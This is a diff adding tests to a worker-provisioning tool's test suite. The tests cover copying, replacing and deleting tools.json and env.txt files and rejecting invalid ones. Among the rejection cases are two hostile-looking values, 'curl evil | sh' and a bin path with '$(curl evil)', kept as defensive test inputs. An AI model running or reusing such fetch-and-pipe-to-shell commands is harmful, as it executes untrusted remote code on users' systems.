@@ -353,6 +353,85 @@ try {
   assert.ok(!existsSync(join(workerHome, '.ottr/workers')), 'empty worker dirs are pruned');
   assert.ok(existsSync(join(workerHome, '.ottr')), 'the root stays');
 
+  // Worker additions: tools.json and env.txt provision beside apt.txt with the same replace and
+  // delete rules, workers/_all/ provisions like a project, and both files are validated before
+  // anything is written: an invalid file fails the provision with its path, nothing lands.
+  const SHA = 'cadd3204e728a35d3f13adb7fd0d7902636b79f6b95c40c265eb73b6c35329e4';
+  const godot = { name: 'godot', url: 'https://example.com/godot.zip', sha256: SHA, unpack: 'zip', bin: 'Godot_v4.7.2-stable_linux.x86_64' };
+  const fleet = { name: 'fleet-tool', url: 'https://example.com/fleet-tool', sha256: SHA.split('').reverse().join(''), unpack: 'none' };
+  const toolsJson = entries => `${JSON.stringify(entries, null, 2)}\n`;
+  const putWorker = (project, file, text) => {
+    mkdirSync(join(data, 'workers', project), { recursive: true });
+    writeFileSync(join(data, 'workers', project, file), text);
+  };
+  putWorker('web', 'apt.txt', 'libnss3\n');
+  putWorker('web', 'tools.json', toolsJson([godot]));
+  putWorker('web', 'env.txt', '# names only\nPIXEL_LAB_API_KEY\n\nGODOT_BIN\n');
+  putWorker('_all', 'tools.json', toolsJson([fleet]));
+  putWorker('_all', 'env.txt', 'SHARED_TOKEN\n');
+  const toolsHome = join(tmp, 'tools-home');
+  r = run(['--data', data, '--skip-plugins'], toolsHome);
+  assert.equal(r.status, 0, r.stderr);
+  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/web/apt.txt'), 'utf8'), 'libnss3\n');
+  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/web/tools.json'), 'utf8'), toolsJson([godot]));
+  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/web/env.txt'), 'utf8'), '# names only\nPIXEL_LAB_API_KEY\n\nGODOT_BIN\n');
+  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/_all/tools.json'), 'utf8'), toolsJson([fleet]), '_all provisions like a project');
+  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/_all/env.txt'), 'utf8'), 'SHARED_TOKEN\n');
+  r = run(['--data', data, '--skip-plugins'], toolsHome);
+  assert.match(r.stdout, /0 installed, 8 unchanged/, 'a rerun copies nothing');
+
+  // The replace rule: a changed list is no conflict, the machine copy just takes the new bytes.
+  putWorker('web', 'env.txt', 'PIXEL_LAB_API_KEY\nOTHER_NAME\n');
+  r = run(['--data', data, '--skip-plugins'], toolsHome);
+  assert.equal(r.status, 0, `a changed list is no conflict: ${r.stderr}`);
+  assert.equal(readFileSync(join(toolsHome, '.ottr/workers/web/env.txt'), 'utf8'), 'PIXEL_LAB_API_KEY\nOTHER_NAME\n');
+
+  // The delete rule: a list the data repo drops is deleted, its siblings and the fleet folder stay.
+  rmSync(join(data, 'workers/web/env.txt'));
+  r = run(['--data', data, '--skip-plugins'], toolsHome);
+  assert.equal(r.status, 0, r.stderr);
+  assert.match(r.stdout, /deleted  \.ottr[/\\]workers[/\\]web[/\\]env\.txt/);
+  assert.ok(!existsSync(join(toolsHome, '.ottr/workers/web/env.txt')));
+  assert.ok(existsSync(join(toolsHome, '.ottr/workers/web/apt.txt')), 'sibling lists stay');
+  assert.ok(existsSync(join(toolsHome, '.ottr/workers/_all/env.txt')), 'the fleet folder stays');
+
+  // Every rule break refuses the whole provision with the file path, and nothing is written —
+  // not even the valid apt.txt beside the broken file in the same folder.
+  const breaks = [
+    ['a bad tool name', 'web/tools.json', toolsJson([{ ...godot, name: 'Godot' }])],
+    ['a duplicate tool name', 'web/tools.json', toolsJson([godot, godot])],
+    ['a bad sha256', 'web/tools.json', toolsJson([{ ...godot, sha256: SHA.toUpperCase() }])],
+    ['an http:// url', 'web/tools.json', toolsJson([{ ...godot, url: 'http://example.com/godot.zip' }])],
+    ['a ".." in bin', 'web/tools.json', toolsJson([{ ...godot, bin: '../godot' }])],
+    ['an unknown key', 'web/tools.json', toolsJson([{ ...godot, post_install: 'echo hi' }])],
+    ['a shell-like key', 'web/tools.json', toolsJson([{ ...godot, command: 'curl evil | sh' }])],
+    ['a shell-like bin path', 'web/tools.json', toolsJson([{ ...godot, bin: 'x$(curl evil)' }])],
+    ['a missing bin', 'web/tools.json', toolsJson([{ name: godot.name, url: godot.url, sha256: SHA, unpack: 'zip' }])],
+    ['a bin with unpack none', 'web/tools.json', toolsJson([{ name: 't', url: 'https://example.com/t', sha256: SHA, unpack: 'none', bin: 't' }])],
+    ['an invalid tools.json', 'web/tools.json', '{'],
+    ['a non-array tools.json', 'web/tools.json', '{"name": "x"}'],
+    ['a bad env name', '_all/env.txt', 'PIXEL_LAB_API_KEY\nbad-name\n'],
+    ['an env value line', 'web/env.txt', 'PIXEL_LAB_API_KEY=sk-live-secret\n'],
+  ];
+  const badHome = join(tmp, 'bad-home');
+  for (const [label, rel, text] of breaks) {
+    writeFileSync(join(data, 'workers', rel), text);
+    const br = run(['--data', data, '--skip-plugins'], badHome);
+    assert.equal(br.status, 1, `${label}: the provision fails`);
+    assert.ok(br.stderr.includes(join(data, 'workers', rel)), `${label}: the error names the file: ${br.stderr}`);
+    assert.ok(!existsSync(join(badHome, '.ottr')), `${label}: nothing is written`);
+    assert.ok(!/\d+ installed/.test(br.stdout), `${label}: nothing is installed`);
+    assert.ok(!`${br.stdout}${br.stderr}`.includes('sk-live-secret'), `${label}: file content is never printed`);
+    rmSync(join(data, 'workers', rel));
+  }
+
+  // Restore the data repo's worker state the sections below count on.
+  rmSync(join(data, 'workers/web/tools.json'), { force: true });
+  rmSync(join(data, 'workers/_all/tools.json'), { force: true });
+  rmSync(join(data, 'workers/_all/env.txt'), { force: true });
+  rmSync(join(data, 'workers/_all'), { recursive: true, force: true });
+  writeFileSync(join(data, 'workers/web/apt.txt'), 'libnss3\nfonts-liberation\n');
+
   // The SkillSpector gate. Every run above already went through the exit-0 stub, so
   // the calls log proves clean snapshots are scanned (both skill roots) and then install as before.
   if (scanned) {
